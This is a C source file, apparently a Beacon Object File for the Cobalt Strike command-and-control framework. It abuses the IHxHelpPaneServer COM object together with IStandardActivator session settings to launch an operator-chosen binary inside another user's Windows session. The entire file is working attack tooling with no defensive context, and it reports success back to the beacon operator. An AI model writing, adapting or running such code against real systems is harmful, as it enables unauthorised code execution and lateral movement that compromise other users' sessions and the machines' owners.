#include <windows.h>
#include <stdio.h>
#include <wchar.h>
#include "IHxExec.h"
#include "IStandardActivator_h.h"
#include "executecrosssession.h"
#include "beacon.h"

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")


// Initialize IHxHelpPaneServer GUIDs
HRESULT CoInitializeIHxHelpIds(GUID *Clsid, GUID *Iid) {
    HRESULT Result = S_OK;

    Result = OLE32$CLSIDFromString(L"{8cec58ae-07a1-11d9-b15e-000d56bfe6ee}", Clsid);
    if (!SUCCEEDED(Result))
        return Result;

    Result = OLE32$CLSIDFromString(L"{8cec592c-07a1-11d9-b15e-000d56bfe6ee}", Iid);
    return Result;
}

// Ensure file protocol in URL
void EnsureFileProtocol(wchar_t **programPath) {
    const wchar_t *prefix = L"file:///";
    size_t prefix_len = MSVCRT$wcslen(prefix);
    size_t url_len = MSVCRT$wcslen(*programPath);
	
    if (url_len < prefix_len || MSVCRT$wcsncmp(*programPath, prefix, prefix_len) != 0) {
        size_t new_len = prefix_len + url_len + 1;
        wchar_t *new_url = (wchar_t *)MSVCRT$malloc(new_len * sizeof(wchar_t));
        MSVCRT$wcscpy_s(new_url, new_len, prefix);
        MSVCRT$wcscat_s(new_url, new_len, *programPath);
        *programPath = new_url;
    }
}

HRESULT CrossExecuteCOMTask(wchar_t *programPath, DWORD session) {
    HRESULT hr;
    IStandardActivator *pComAct = NULL;
    ISpecialSystemProperties *pSpecialProperties = NULL;
    IHxHelpPaneServer *pIHxHelpPaneServer = NULL;
    MULTI_QI qis[1] = {0};
	
    EnsureFileProtocol(&programPath);

    IID CLSIDIHxHelpPaneServer;
    IID IIDIHxHelpPaneServer;
    hr = CoInitializeIHxHelpIds(&CLSIDIHxHelpPaneServer, &IIDIHxHelpPaneServer);
    if (FAILED(hr)) return hr;

    hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return hr;

    const IID CLSIDComActivator = {0x0000033C, 0x0000, 0x0000, {0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};
    const IID IIDIStandardActivator = {0x000001b8, 0x0000, 0x0000, {0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};
    hr = OLE32$CoCreateInstance(&CLSIDComActivator, NULL, CLSCTX_INPROC_SERVER, &IIDIStandardActivator, (void **)&pComAct);
    if (FAILED(hr)) goto Cleanup;
	
    const IID IIDISpecialSystemProperties = {0x000001b9, 0x0000, 0x0000, {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};
    hr = pComAct->lpVtbl->QueryInterface(pComAct, &IIDISpecialSystemProperties, (void **)&pSpecialProperties);
    if (FAILED(hr)) goto Cleanup;
	
    hr = pSpecialProperties->lpVtbl->SetSessionId(pSpecialProperties, session, 0, 1);
    if (FAILED(hr)) goto Cleanup;
	
    qis[0].pIID = &IIDIHxHelpPaneServer;
    hr = pComAct->lpVtbl->StandardCreateInstance(pComAct, &CLSIDIHxHelpPaneServer, NULL, CLSCTX_ALL, NULL, 1, qis);
    if (FAILED(hr)) goto Cleanup;

    pIHxHelpPaneServer = (IHxHelpPaneServer *)(qis[0].pItf);
	
    hr = pIHxHelpPaneServer->lpVtbl->Execute(pIHxHelpPaneServer, programPath);
    if (FAILED(hr)) goto Cleanup;
	
Cleanup:
    if (pComAct) pComAct->lpVtbl->Release(pComAct);
    if (pSpecialProperties) pSpecialProperties->lpVtbl->Release(pSpecialProperties);
    if (pIHxHelpPaneServer) pIHxHelpPaneServer->lpVtbl->Release(pIHxHelpPaneServer);
    OLE32$CoUninitialize();
	
    return hr;
}

int go(char *args, int len) {
	datap parser;
    WCHAR *programPath = L"";
    DWORD *session;
	
	BeaconDataParse(&parser, args, len);
	programPath = BeaconDataExtract(&parser, NULL);
	session = BeaconDataInt(&parser);
	
	HRESULT hr = CrossExecuteCOMTask(programPath, session);
	if (SUCCEEDED(hr)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully started COM object in session ID %d and executed binary: %ls\n", session, programPath);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed operation with error code: 0x%08lx\n", hr);
    }
	
    return 0;
}
